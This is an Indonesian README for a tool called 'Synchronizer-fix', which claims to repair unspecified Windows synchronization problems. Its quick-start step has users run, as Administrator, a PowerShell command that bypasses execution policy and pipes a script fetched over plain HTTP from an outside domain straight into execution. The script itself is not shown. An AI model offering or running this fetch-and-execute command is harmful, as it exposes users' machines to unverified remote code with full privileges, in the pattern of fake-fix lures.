# Synchronizer-fix

Alat perbaikan sinkronisasi sistem otomatis menggunakan skrip PowerShell.

## Deskripsi

Proyek ini bertujuan untuk mempermudah pengguna dalam memperbaiki masalah sinkronisasi pada sistem Windows melalui skrip PowerShell yang dijalankan secara remote. Proyek ini mencakup skrip perbaikan utama dan tutorial berbasis HTML untuk memudahkan pengguna awam.

## Isi Proyek

- `synchronizer-fix.ps1`: Skrip PowerShell utama yang berisi logika perbaikan.
- `index.html`: Tutorial interaktif langkah-demi-langkah untuk menjalankan skrip.

## Cara Penggunaan

### Metode Cepat (PowerShell)

Buka PowerShell sebagai Administrator dan jalankan perintah berikut:

```powershell
powershell -ExecutionPolicy Bypass -Command "irm http://script.minicenter.my.id/synchronizer-fix.ps1 | iex"
```

### Metode Tutorial (HTML)

1. Buka file `index.html` di browser pilihan Anda (Chrome, Edge, Firefox, dll).
2. Ikuti panduan visual yang disediakan di halaman tersebut.
3. Gunakan tombol **Salin** untuk mengambil perintah dan tempelkan ke PowerShell.

## Prasyarat

- Windows 10 atau 11.
- Hak akses Administrator.
- Koneksi internet aktif (untuk mengunduh skrip dari remote source).

---
*Dibuat untuk mempermudah pemeliharaan sistem secara otomatis.*